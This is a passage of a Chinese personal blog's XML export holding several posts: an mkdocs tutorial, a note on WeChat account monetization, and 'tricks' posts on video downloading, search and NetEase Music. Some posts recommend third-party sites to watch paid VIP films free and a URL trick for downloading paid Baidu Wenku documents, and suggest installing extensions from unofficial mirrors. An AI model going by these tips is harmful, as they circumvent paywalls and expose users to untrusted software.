    <content type="text"><![CDATA[那一年，我9岁，她11岁，我告诉她将来要娶她，她也很调皮的回答我：好啊!那一年，我14岁，她16岁，她高我一头，我抬着头说我喜欢她，她怔怔听着，没说话，便转过头去，不再望我。那一年，我18岁，她20岁，我已经在工地扛水泥一年了，她还上着重点大学，我再也说不出口我喜欢她，因为我觉得自己根本配不上她，我把想对她说的话，留给了自己，等我配上她的时候，再全部告诉她。后来四年里，我再没有机会见过她，听说她已经工作了，我更关心的是，她是否已为人妻，已为人母，我的事业渐渐走向正轨，我了解了区块链，认识了群主，投资了数字货币，再也不为钱所窘迫。当我再次见到她时，是在淡水，昏黄的房间，只有我们两个人，沉默了良久，她开口了：八百，看你是熟人，就收你五百。我尽量让自己不再颤抖，我说：跟我走吧，她目光呆滞了一下，随即闪烁了一下，然后又像一团火熄灭了一样，说：我配不上你，我只是一位小姐，我还有客人，没什么事 ，我先走了。她就匆忙的离去了。后来，我在电视上看到了她，她被两名民警押着，一脸惊恐与不堪，电视甚至没有给她遮住脸，任由她在我面前晃着，任由她在我心中撞着、撞着、直至粉碎。最后一次见她，是她找我去的，当时她在楼顶，我在楼下抬头望她，像我当年告诉她，我喜欢她时一样，电话里她说：我得了重病，没法治了，你别担心，临走之前我只想问你：曾经你真的爱过……我么……我哭着说:是她说：那。。那。。你能告诉我，为什么你现在这么有钱?我说：2019年，我投资了nas 流落荒岛怎么办？掏出纸笔发点区块链货币先 https://oicebot.github.io/2018/05/30/how-to-run-a-blockchain-on-a-deserted-island.html go 语言与区块链基础 比特币（btc）价格分析 完美重现九神《囤比特币：寻找合适的够买时机》 https://github.com/Ksloveyuan/btc_price_analyzer pandas+pyecharts 实践笔记：比特币价格分析 https://learnku.com/articles/34807 好多视频比特币 https://haoduoshipin.com/]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 文档生成器 mkdocs]]></title>
    <url>%2F2019%2F06%2F21%2FPython-%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90%E5%99%A8-mkdocs%2F</url>
    <content type="text"><![CDATA[mkdocs 是一个基于Python 对 Markdown 非常友好的文档生成器，中文文档地址 使用 mkdocs 我们可以用 md 编写自己的文档，而且可以免费部署到 GitHub 。 安装pip install mkdocs 新建文档123456789101112131415161718λ mkdocs.exe new mydocINFO - Creating project directory: mydocINFO - Writing config file: mydoc\mkdocs.ymlINFO - Writing initial docs: mydoc\docs\index.mdλ cd mydoc\d:\code\mydocλ lsdocs/ mkdocs.ymld:\code\mydocλ mkdocs serveINFO - Building documentation...INFO - Cleaning site directory[I 190528 20:32:49 server:296] Serving on http://127.0.0.1:8000[I 190528 20:32:49 handlers:62] Start watching changes[I 190528 20:32:49 handlers:64] Start detecting changes[I 190528 20:33:06 handlers:135] Browser Connected: http://127.0.0.1:8000/ 编辑文档vi docs/index.md把 command 改为中文 命令 记得把文件改为 utf8 编码，否则会出错1234INFO - Building documentation...ERROR - Encoding error reading file: index.mdERROR - Error reading page 'index.md': 'utf-8' codec can't decode byte 0xc3 in position 92: invalid continuation byte[E 190528 20:38:45 ioloop:801] Exception in callback &lt;bound method LiveReloadHandler.poll_tasks of &lt;class 'livereload.handlers.LiveReloadHandler'&gt;&gt; 刷新看到效果 vi mkdocs.yml把site_name 的 my docs 改为中文 我的文档 添加页面vi about.md vi mkdocs.yml1234site_name: 文档pages:- [index.md, Home]- [about.md, About] 然后报错了1234567891011121314151617INFO - Building documentation...ERROR - Config value: 'pages'. Error: Invalid pages config. &#123;&lt;class 'list'&gt;&#125; &#123;&lt;class 'str'&gt;, &lt;class 'dict'&gt;&#125;[E 190529 09:57:45 ioloop:801] Exception in callback &lt;bound method LiveReloadHandler.poll_tasks of &lt;class 'livereload.handlers.LiveReloadHandler'&gt;&gt; Traceback (most recent call last): File "d:\python\lib\site-packages\tornado\ioloop.py", line 1229, in _run return self.callback() File "d:\python\lib\site-packages\livereload\handlers.py", line 69, in poll_tasks filepath, delay = cls.watcher.examine() File "d:\python\lib\site-packages\livereload\watcher.py", line 105, in examine func() File "d:\python\lib\site-packages\mkdocs\commands\serve.py", line 107, in builder site_dir=site_dir File "d:\python\lib\site-packages\mkdocs\config\base.py", line 210, in load_config "Aborted with &#123;0&#125; Configuration Errors!".format(len(errors)) mkdocs.exceptions.ConfigurationError: Aborted with 1 Configuration Errors!λ mkdocs -Vmkdocs, version 1.0.4 from d:\python\lib\site-packages\mkdocs (Python 3.7) Google 查找到issue https://github.com/mkdocs/mkdocs/issues/1770https://www.mkdocs.org/user-guide/writing-your-docs/#configure-pages-and-navigation改为12345site_name: 我的文档nav:- 主页: 'index.md'- 关于: 'about.md'theme: readthedocs https://markdown-docs-zh.readthedocs.io/zh_CN/latest/ 原来是中文文档过时了。 站点生成1234567λ mkdocs buildINFO - Cleaning site directoryINFO - Building documentation to directory: d:\code\mydoc\sited:\code\mydocλ lsdocs/ mkdocs.yml site/ 一段时间后, 可能有文件被从源码中移除了, 但是相关的文档仍残留在 site 目录中. 在构建命令中添加 –clean 参数即可移除这些文档.12345678910111213$ mkdocs build --cleanλ cd site\d:\code\mydoc\siteλ ls404.html css/ img/ js/ search.html sitemap.xml.gzabout/ fonts/ index.html search/ sitemap.xmld:\code\mydoc\siteλ php -S localhost:8000PHP 7.1.13 Development Server started at Wed May 29 10:17:19 2019Listening on http://localhost:8000 部署到GitHub部署之前先配置下GitHub秘钥cd ~/.sshssh-keygen -t rsa -C “mysusheng@gmail.com”这里不要一路回车，我们自己手动填写保存路径vi config123456Host github.comHostName github.comUser gitIdentityFile ~/.ssh/mysushengλ ssh -T git@github.comHi sushengbuhuo! You've successfully authenticated, but GitHub does not provide shell access. 然后将公钥上传到GitHub 配置。12345678910111213141516171819202122232425262728293031323334353637383940λ git clone https://github.com/sushengbuhuo/markdown_docCloning into 'markdown_doc'...remote: Enumerating objects: 3, done.remote: Counting objects: 100% (3/3), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.d:\codeλ cd markdown_doc\d:\code\markdown_doc (master)λ lsREADME.mdd:\code\markdown_doc (master)λ mkdir docsd:\code\markdown_doc (master)λ cd docs\d:\code\markdown_doc\docs (master)λ mkdocs.exe new .INFO - Writing config file: .\mkdocs.ymlINFO - Writing initial docs: .\docs\index.mdd:\code\markdown_doc\docs (master)λ mkdocs buildINFO - Cleaning site directoryINFO - Building documentation to directory: d:\code\markdown_doc\docs\sited:\code\markdown_doc\docs (master)λ echo "site/" &gt;&gt; .gitignored:\code\markdown_doc\docs (master)λ mkdocs gh-deploy --cleanINFO - Cleaning site directoryINFO - Building documentation to directory: d:\code\markdown_doc\docs\siteWARNING - Version check skipped: No version specificed in previous deployment.INFO - Copying 'd:\code\markdown_doc\docs\site' to 'gh-pages' branch and pushing to GitHub.INFO - Your documentation should shortly be available at: https://sushengbuhuo.github.io/markdown_doc/ 就是把site目录代码上传到github gh-pages分支了. 推送完成后浏览器访问 https://sushengbuhuo.github.io/markdown_doc/ 就可以看到效果了，接着修改md文件完善你的文档。 资源GitHub + Travis + Mkdocs 搭建文档库Python 中文数据结构和算法教程类似gitbook生成文档工具Python Web 入坑指南mkdocs配置文档查询工具支持数学公式git配置多个SSH Key图说设计模式，使用图形和代码结合的方式来解析设计模式 推荐阅读：Pyhon 爬虫框架 looter 5 分钟使用 hugo 搭建一个自己的博客Python 词云分析周杰伦《晴天》 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运营公众号一个月，我开通了流量主]]></title>
    <url>%2F2019%2F06%2F21%2F%E8%BF%90%E8%90%A5%E5%85%AC%E4%BC%97%E5%8F%B7%E4%B8%80%E4%B8%AA%E6%9C%88%EF%BC%8C%E6%88%91%E5%BC%80%E9%80%9A%E4%BA%86%E6%B5%81%E9%87%8F%E4%B8%BB%2F</url>
    <content type="text"><![CDATA[我的公众号 2017 年就注册了，但没怎么认真写过，开通原创后就没怎么更新了。 如果不是今年微信把流量主门槛放至500粉丝（之前是5000），可能我都想不起来这个号。。。 庆幸那时候拿到了留言功能，现在新开的公众号都没有留言功能了。 于是5月12号（那天还是母亲节）开始重新更新公众号。写了一篇关于微信的文章 微信好友头像拼图 https://mp.weixin.qq.com/s/GK3fp-cUSeByUrqINGFXHg 接着13,14,15,16号日更，说实话真费时间和精力，首先是想好个主题，然后开始完善，测试，排版，预览，推送。 我的排版比较随意，用的开源工具https://github.com/lyricat/wechat-format ,这个支持markdown，非常不错,效果还可以的。然后搜索了下还有http://md.aclickall.com/ 也不错。 写好了一篇精心准备的文章，然后想着怎么增加阅读量，开通简书，知乎，加群，发红包，还是有点效果的，第一天粉丝就加了20多。 为了增加关注，修改了下简介。增加了3个菜单。 设置自动回复。关键词回复。 回复留言。设置精选文章。还收到几个赞赏，好感动，这是对我直接的经济支持了。 那些你可能不知道的浏览器奇技淫巧 https://mp.weixin.qq.com/s/-cSjrvkibYGp5Fx8gCTFuw 这篇文章还被转载过3次。连续写了6篇奇技淫巧系列文章后，终于在今天粉丝突破了500。 小目标终于完成了，开始开通流量主吧。 广告有3种：公众号底部广告，文中广告，返佣商品。 接着扫码绑定微信广告助手就完成了。 开通以后的流量主页面。 开通流量主只是个开始，接下来我会保持每周更新，分享一些对你可能有帮助的东西，但愿不会浪费你的时间。 推荐阅读： 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的视频下载奇技淫巧 最后推荐几个写公众号可能用得上的工具和网站吧。 新榜 https://www.newrank.cn西瓜数据http://data.xiguaji.com/微信公号写手工具http://writertools.funnyapi.com/#/home效率集工具平台 https://u.tools/万能工具站https://wn.run/cn/工具集合https://miku.tools/微信公众号文章同步助手 https://www.wechatsync.com/公众号下载 http://118.24.158.116:8888/wechat_download.zip朋友圈生成电子书 https://github.com/shengqiangzhang/examples-of-web-crawlers自媒体导航网站http://guozhivip.com/pod/Server酱http://sc.ftqq.com/3.version微信消息推送服务 http://wxpusher.dingliqc.com/ 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的免费观看 VIP 视频奇技淫巧]]></title>
    <url>%2F2019%2F06%2F21%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E5%85%8D%E8%B4%B9%E8%A7%82%E7%9C%8B-VIP-%E8%A7%86%E9%A2%91%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[这是奇技淫巧系列第 7 篇文章，有兴趣点下面链接看之前的文章。 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 国内新上映的电影一般都可以在优酷，爱奇艺，腾讯视频上看到。比如《雪暴》《精武陈真》。 但这些都是 VIP 电影，如果你有 VIP 直接看就行了，但对于偶尔看看电影的人来说，买VIP没必要，如果想看怎么办呢？这时候就需要油猴插件了。 油猴什么是油猴？它是一款免费的浏览器插件，可以实现各种意想不到的功能，如观看 VIP 电影、去除网页防止复制功能、直接下载网盘文件等。 它支持 Chrome, Microsoft Edge, Safari, Opera Next, 和 Firefox 等浏览器。 我使用的是 Google 浏览器, google.cn 域名在国内是可以访问的，类似 https://golang.google.cnhttps://developers.google.cn 也都可以，所以直接在 https://www.google.cn/chrome/ 下载Google浏览器就好了。 打开油猴网站 https://www.tampermonkey.net/直接下载插件就好了，但下载地址 https://chrome.google.com/webstore/detail/dhdgffkkebhmkfjojejmpbldmpobfkfo 在国内无法访问的。可以使用第三方Chrome插件下载网站 https://www.chromedownloads.net/extensions/551.html 这个来下载。类似的第三方网站还有 https://www.crx4chrome.com/ http://chromecj.com/ http://www.cnplugins.com/ https://www.chromefor.com/https://www.gugeapps.net/ 下载好插件Tampermonkey_v4.7.54.crx 后，浏览器打开 chrome://extensions/将这个文件直接拖进去就好了，如果提示错误，将 Tampermonkey_v4.7.54.crx 文件名改为 Tampermonkey_v4.7.54.zip 安装成功后这里有个图标。 Greasy ForkGreasy Fork 又是什么呢？这是个提供用户脚本的网站 ，具体使用见网址https://greasyfork.org/zh-CN 然后在上面输入 视频 第一个就是 VIP 视频解析了。它支持优酷vip，腾讯vip，爱奇艺vip，芒果vip，乐视vip等常用视频网站。 直接点击安装就好了安装完成后点击右上角的图标，可以看到安装好的脚本。 观看 VIP 电影打开爱奇艺上这部 《雪暴》，播放后左上角有vip图标 https://www.iqiyi.com/v_19rr614cr8.html 点击 视频解析 会跳转到解析网站 http://tv.wandhi.com/go.html?url=https%3A%2F%2Fwww.iqiyi.com%2Fv_19rr614cr8.html 然后就可以直接看这部近2小时的电影。 如果播放不了，选择切换接口。 除了看视频还能下载音乐，比如网易上这首陈绮贞的《太阳》 https://music.163.com/#/song?id=209112点击音乐下载会跳转到下载网站， 直接下载就好了。 VIP 解析网站其实这个油猴插件用的就是类似 http://tv.wandhi.com/go.html 这类网站来解析，如果你嫌安装插件麻烦，直接打开 http://tv.wandhi.com/go.html 这个网站，输入对应视频网站的电影链接播放也可以的，用插件的目的是为了方便。 如果这个网站挂了或者不能看了，可以搜索出很多对应的网站。 如果有什么问题，欢迎留言评论。 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的视频下载奇技淫巧]]></title>
    <url>%2F2019%2F06%2F17%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[之前已经写过好几篇的奇技淫巧系列了，今天说说怎么快速下载视频。 我平常经常看视频的网站就是爱奇艺，b站，微博，知乎，网易这些。 这里以微博为例，下载周杰伦的《晴天》，微博地址是 https://weibo.com/1871765890/HyPPQoaeH下面是几种下载方法。 自力更生按F12打开控制台，在network中搜索.mp4找到mp4文件 复制地址就是这个了 ，然后直接另存为保存到电脑。https://f.us.sinaimg.cn/001grNbNlx07u5gBTJMI01041203mpey0E020.mp4?label=mp4_720p&amp;template=1280x720.20.0&amp;Expires=1560614974&amp;ssig=vp5%2B3ARIGs&amp;KID=unistore,video Chrome 扩展安装一键视频下载器 https://chrome.google.com/webstore/detail/one-click-video-downloade/bhepgcoaibmmehlmckhlmbdgcemhidcg?hl=zh-CN由于Google域名在国内不可访问，可以使用第三方网站http://chrome-extension-downloader.com/或者www.gugeapps.net来下载点击浏览器右上角一键视频下载器按钮，直接点击下载。油猴也有对应的下载脚本，有兴趣可以在https://greasyfork.org/zh-CN 找到。 浏览器嗅探这里用的是遨游浏览器的嗅探功能，播放视频以后直接点击资源嗅探器选中视频直接下载就行了。 页面上的图片也可以直接这样下载，可以说很方便了。网易云音乐也可以下载。 视频解析网站视频解析网 https://www.parsevideo.com/ 输入微博地址，直接获取下载地址。当然还支持b站，优酷，腾讯等视频网站。比如下载b站的 周杰伦《晴天》https://www.bilibili.com/video/av36043614视频素材来自电影《不能说的秘密》，如果想看完整版在公众号回复 不能说的秘密 获取。 对应的视频下载网站还有这些： b站视频下载 http://www.jijidown.com/ https://www.ibilibili.com/ https://www.kanbilibili.com/微信视频下载 http://www.15um.com/tools/weixin_v.php微博视频下载 http://www.weibodang.cn/dang.php https://weibomiaopai.com/ 视频在线解析下载 https://www.videofk.com媒体工具下载集合 https://miku.tools/视频鱼http://www.shipinyu.cn/extractorswn万能命令https://wn.run/cn/ 命令行最好的总留在最后，我平常都用命令行来下载的，主要是方便。you-get是个基于Python的下载工具，直接 pip3 install you-get 来安装，https://github.com/soimort/you-getwindows安装见 https://github.com/soimort/you-get/releases/latest 具体使用说明 https://github.com/soimort/you-get/wiki/%E4%B8%AD%E6%96%87%E8%AF%B4%E6%98%8E它支持国内外大多数视频网站，如YouTube ，Twitter，网易云音乐，bilibili ，爱奇艺，优酷，腾讯视频，秒拍等。查看视频属性1234567891011121314151617181920212223242526272829303132333435363738394041λ you-get -i https://www.bilibili.com/video/av36043614site: Bilibilititle: 一个MV 周杰伦《晴天》streams: # Available quality and codecs [ DASH ] ____________________________________ - format: dash-flv720 container: mp4 quality: 高清 720P size: 80.8 MiB (84735780 bytes) # download-with: you-get --format=dash-flv720 [URL] - format: dash-flv480 container: mp4 quality: 清晰 480P size: 42.4 MiB (44437476 bytes) # download-with: you-get --format=dash-flv480 [URL] - format: dash-flv360 container: mp4 quality: 流畅 360P size: 16.3 MiB (17131306 bytes) # download-with: you-get --format=dash-flv360 [URL] [ DEFAULT ] _________________________________ - format: flv720 container: flv quality: 高清 720P size: 81.0 MiB (84952120 bytes) # download-with: you-get --format=flv720 [URL] - format: flv480 container: flv quality: 清晰 480P size: 42.6 MiB (44653816 bytes) # download-with: you-get --format=flv480 [URL] - format: flv360 container: flv quality: 流畅 360P size: 16.5 MiB (17347646 bytes) # download-with: you-get --format=flv360 [URL] 然后下载高清720P1234567891011121314λ you-get --format=flv720 https://www.bilibili.com/video/av36043614site: Bilibilititle: 一个MV 周杰伦《晴天》stream: - format: flv720 container: flv quality: 高清 720P size: 81.0 MiB (84952120 bytes) # download-with: you-get --format=flv720 [URL]Downloading 一个MV 周杰伦《晴天》.flv ... 100% ( 81.0/ 81.0MB) ├████████████████████████████████████████┤[1/1] 8 MB/sDownloading 一个MV 周杰伦《晴天》.cmt.xml ... 连弹幕都下载了。 12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;i&gt;&lt;chatserver&gt;chat.bilibili.com&lt;/chatserver&gt;&lt;chatid&gt;63275197&lt;/chatid&gt;&lt;mission&gt;0&lt;/mission&gt;&lt;maxlimit&gt;1000&lt;/maxlimit&gt;&lt;state&gt;0&lt;/state&gt;&lt;real_name&gt;0&lt;/real_name&gt;&lt;source&gt;k-v&lt;/source&gt;&lt;d p="34.81500,1,25,16777215,1553437709,0,8b234fa4,13786433456177156"&gt;粉了 开口脆&lt;/d&gt;&lt;d p="62.78200,1,25,16777215,1553961853,0,8f59d6d3,14061235858309120"&gt;周冬雨和这女的像&lt;/d&gt;&lt;d p="39.79900,1,25,16777215,1556429301,0,93d7a1dd,15354889194438658"&gt;不能说的秘密&lt;/d&gt;&lt;/i&gt; 具体下载过程我用TermRecord录制了个命令行下载记录 http://118.24.158.116:8888/jay.html 对应的 go 版本也有annie https://github.com/iawia002/annie 使用 go get github.com/iawia002/annie 安装，也可以直接下载二进制文件 https://github.com/iawia002/annie/releases这里下载流畅版本，只有16M大小。123456789101112λ annie -f 16 https://www.bilibili.com/video/av36043614 Site: 哔哩哔哩 bilibili.com Title: 一个MV 周杰伦《晴天》 Type: video Stream: [16] ------------------- Quality: 流畅 360P Size: 16.54 MiB (17347646 Bytes) # download with: annie -f 16 ... 16.54 MiB / 16.54 MiB [=======================================================================] 100.00% 1.32 MiB/s 12s 下载上面那个微博视频123456789101112131415161718192021λ annie -f 480 https://weibo.com/tv/v/HvyNcv6kC?fid=1034:4375218609978642 Site: 微博 weibo.com Title: #一首青春里的歌#周杰伦《晴天》超清MV版从前从前 有个人爱你很久但偏偏 风渐渐把距离吹得好远好不容易 又能再多爱一天但故事的最后你好像还是说了 拜拜有多少人是因为这段喜欢上这首歌的？《晴天》承载了许多人的青春记忆，它是你青春里的歌吗？ Type: video Stream: [480] ------------------- Quality: 480 Size: 26.52 MiB (27803497 Bytes) # download with: annie -f 480 ... 26.52 MiB / 26.52 MiB [=======================================================================] 100.00% 1.52 MiB/s 17s 另外说下 ffmpeg ，这是个非常好用的音视频处理工具，下载地址 https://ffmpeg.org/download.html 之前写过一篇 ffmpeg 将视频转GIF https://mp.weixin.qq.com/s/624Hv1krGUboecz1QX8O1g有些网站使用的是 m3u8 格式来播放视频，找到m3u8文件地址就可以用ffmpeg来下载了。ffmpeg -i &quot;http://xxx.m3u8&quot; -vcodec copy -acodec copy -absf aac_adtstoasc 下载的视频名称.mp4 好了，有了上面这些方法下载视频再也不用愁了，如果你有更好的下载方式欢迎留言交流。 推荐阅读：那些你可能不知道的搜索奇技淫巧 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的搜索奇技淫巧]]></title>
    <url>%2F2019%2F06%2F10%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%90%9C%E7%B4%A2%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[互联网时代每天产生大量的数据，如何快速找到我们需要的信息，这就需要靠搜索引擎了，今天就说说那些你可能每天在用但还不知道的搜索技巧。 搜索网站最常用的自然是 baidu Google bing ，其实还有个搜狗，这个搜索微信公众号和知乎很实用。 当然还有些小众的搜索引擎，如 搜索引擎汇集网站快搜 https://search.chongbuluo.com/一个不追踪你的搜索引擎 秘迹搜https://mijisou.com/鸟搜 http://126kr.com/ 关键字搜索这个最常用了，比如直接输入 周杰伦 可以找到关于周杰伦的信息。点击旁边的图片可以搜到 jay 的图片还有新闻，视频和地图等。 我常用的还是在 工具 里选择时间，比如想看最近关于周杰伦的消息可以选择过去一个月内，可以看到jay参加了朗朗的婚礼。 多关键词之间空格分割，如 周杰伦 不能说的秘密 搜索自然常数 e 可以直接使用计算器了。 另外百度上搜索 黑洞 抖动 摇一摇 Duang 等关键词会有特效，很酷炫，如果没有看过的话赶紧百度下。 过滤搜索比如不想搜关于 不能说的秘密 的周杰伦信息，可以加上 -搜 周杰伦 -不能说的秘密 指定网站搜索比如想搜索知乎上最近关于周杰伦的讨论，搜索 site:zhihu.com 周杰伦，注意网址不要带http:// 当然也可以直接在知乎上搜索，但搜索效果还是有差异的。 另外有些网站没有搜索功能的都可以这样来搜索。 文档搜索比如写关于 5G 的论文，可以搜 filetype:doc 5G百度上有许多关于5G的文档，比如第一条的 https://wenku.baidu.com/view/891adcdfa1116c175f0e7cd184254b35effd1a43.html 但是百度上需要VIP才能下载。 有个网站提供了文库下载功能，只需要将地址中的baidu改为baiduvvv，地址就成了 https://wenku.baiduvvv.com/view/891adcdfa1116c175f0e7cd184254b35effd1a43.html 直接点下载即可。 如果嫌麻烦可以使用 冰点文库下载器，无需积分，注册和登录就可以自由下载百度、豆丁等文库的文档，下载的文档可以生成高清晰 pdf 格式。 公众号内回复 文库下载 获取冰点文库下载器。 电影/书籍/小说搜索比如想看万历十五年这本书，可以加《》 ，搜 《万历十五年》对比下不加《》的效果 电子书搜索可以使用专业的鸠摩搜索 https://www.jiumodiary.com/，比如搜 明朝那些事 可以找到对应的网盘链接。 快照搜索可能由于某些不可抗力因素，网上有些信息被删了，这时候就需要快照功能了，它会有存档。 点击网页快照可以看到6月2号存档的结果，当然这只是个例子，这个网页并没有被删除。 有人还开发了个网页快照网https://2tool.top/，在某个网址的域名前面加上his.sh/ ，即可显示该网址在各大搜索引擎的网页快照。 互联网档案搜索互联网上的记录都被记录在 archive.org 和 archive.is 这类网站，它是个网站时光机。 比如可以搜到 03 年的腾讯。 图片搜索这个还有很有用的，有时候看到一张电影海报，但不知是哪部电影，这个时候就需要百度/谷歌识图了，直接上传图片或者图片地址即可搜索出图片的信息。 比如这张电影海报，左边是张国荣，右边的女星没什么印象。这个时候百度识图下 https://image.baidu.com/?fr=shitu 就知道是和哥哥一起合作的电影《纵横四海》的钟楚红了。 高级搜索如果以上搜索结果还不满意，可以自定义设置搜索。 微信搜索微信是最常用的APP了，自带的搜索可以搜朋友圈，文章，公众号，小程序，音乐和表情，比如快端午了，搜出来的表情包可以直接发送微信好友。 可以搜朋友分享过的文章，按阅读量排序。输入自己的微信昵称，点击更多群聊就可以找到自己曾经加过的的所有群（包括没有保存到通讯录的群）！具体见之前的文章https://mp.weixin.qq.com/s/eGDO0Y8el_dsEyriCoAgog 微博搜索如今微博成了娱乐，社会热点的第一阵地，想第一时间吃瓜去微博就好了。 如果端午节想去哪个景点，比如庐山 可以看看网友们在庐山的感受。 。 企业信息搜索全国企业信用信息公示系统 http://bj.gsxt.gov.cn 可以查到一家企业的法定代表人、投资人、变更情况等信息，找工作的时候很实用。还有个专业的天眼查 http://www.tianyancha.com/ 教你谷歌/百度可以说你想问的问题，网上大多数人都已经遇到过了，所以掌握这些搜索技巧应该可以应付95%的问题。 所以如果还有人问你 我电脑上不了网怎么办，Excel 怎么换行 之类的，直接给他个教人用百度/谷歌的网站吧。比如 http://lmgtfy.com/ 意思是 Let Me Google That For You，缩写：LMGTFY ，对应百度是 http://lmbtfy.cn/ 进入网站填写 输入关键字搜索，然后生成短链接 http://bfy.tw/NwVr 把这个网址发给对方 http://bfy.tw/NwVr 会以动画的形式教他搜索。百度也一样的，生成微博短链接 http://t.cn/Ai9Xb0di 把地址http://t.cn/Ai9Xb0di 直接发给对方，要不你试试。 好，关于搜索就先说这些了，如果你还有什么更好的搜索技巧，欢迎留言交流。 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的网易云音乐奇技淫巧]]></title>
    <url>%2F2019%2F06%2F10%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[平常听网易云音乐比较多，主要喜欢看看评论，这里就说说网易云音乐。 找到朋友圈分享的网易云主页地址比如我在朋友圈分享了一首许巍的《我的爱》，在朋友圈点击进入复制链接，地址是 https://music.163.com/m/song?id=1303026566&amp;userid=293753445&amp;from=timeline 其中的293753445就是我的userid，然后打开地址https://music.163.com/#/user/home?id=293753445 这就是我的主页，有兴趣关注或者看看我的动态。 所以如果你喜欢的人在朋友圈分享了首网易云歌曲，可以找到他的主页看看他都喜欢些什么歌，找找共同爱好什么的。 下载音乐比如上面那首歌的地址 https://music.163.com/m/song?id=1303026566&amp;userid=293753445&amp;from=timeline 其中的id 1303026566就是歌曲的唯一标识。 然后打开这个地址 https://music.163.com/song/media/outer/url?id=1303026566.mp3，其实就是替换这里的id，打开后另存为就能下载了。 如果嫌麻烦可以使用第三方网站http://www.gequdaquan.net/gqss/ http://tool.liumingye.cn/music/?type=xiami&amp;name=%E9%99%88%E5%A5%95%E8%BF%85 http://www.fulichaoshi.com/ http://music.wandhi.com/http://moresound.tk/music/teach.html#c搜索歌曲，直接点击下载。 下载网易视频比如这个视频 超好听的《Something Just Like This》https://music.163.com/#/video?id=457AF908B0426A0321CEF9F02943DB28按F12打开控制台 复制出地址 hurl=http%3A%2F%2Fvodkgeyttp9.vod.126.net%2Fvodkgeyttp8%2F0J6b5JIi_1396042360_shd.mp4%3FwsSecret%3D96dd1b4e0244bfda57c6fdd960c50dcb%26wsTime%3D1558967505%26ext%3Dnb0MvQeQKPNcsz96aHpBuzRh0rDbAr30FqKl5vr0I%252BsgZVMShOEX3GBbgnTwSg6aco2Iono%252FRKTn6VFQ4YzRv4kfMaaeHRGI2EJ%252BI38ZQkTi9RzE%252BeABsHu2wMaq8Byasv4tM1RYezJr%252BmpM%252Fy8aYK4ZiGH6vlqbZgLxdDo53hBj3eF4PZyek9PZCoF25cWOumUL0dHJwz0%252BGNJQ27akNzjFOr5yrGOBGoNlrAric94cqzdirCuQlmAJEj170IhHGKwUuB26pwXZHBahIkaVSjT6hZbrRH2m92SqU8A4qPJ52Actv%252BQsSyupXoGe72T5u1PbKVec%252FeYoVLFQd2EOuBx%252F1U31SCk6rMELTywziJIequBBoPZyAxRkr%252BJvF%252BX6FaqAsr%252BBavVAghDmSHKu3BUKr%252F4ZHqGiQEYlj%252B41EhCuWfEDBDXfZMzyxnoF1d2MzF4YIqMr1xHys7T92PUrJDYtGmEWpdKYphajwwj%252FoNIENKhTSKwDrlD1zaHseNllgnc6Y3VaT7RynUgcvfAfVd5OoaoRIYeIqqoe1HxLKa0R54ISLaW31spkfVtI97%252F1&amp;murl=http%3A%2F%2Fvodkgeyttp9.vod.126.net%2Fvodkgeyttp8%2FoYGrmcJY_1396042360_hd.mp4%3FwsSecret%3Dfaef4ea063513745ac19beb95ad14cb1%26wsTime%3D1558966708%26ext%3Dnb0MvQeQKPNcsz96aHpBuzRh0rDbAr30FqKl5vr0I%252BsgZVMShOEX3GBbgnTwSg6aco2Iono%252FRKTn6VFQ4YzRv4kfMaaeHRGI2EJ%252BI38ZQkTi9RzE%252BeABsHu2wMaq8Byasv4tM1RYezJr%252BmpM%252Fy8aYK4ZiGH6vlqbZgLxdDo53hBj3eF4PZyek9PZCoF25cWOumUL0dHJwz0%252BGN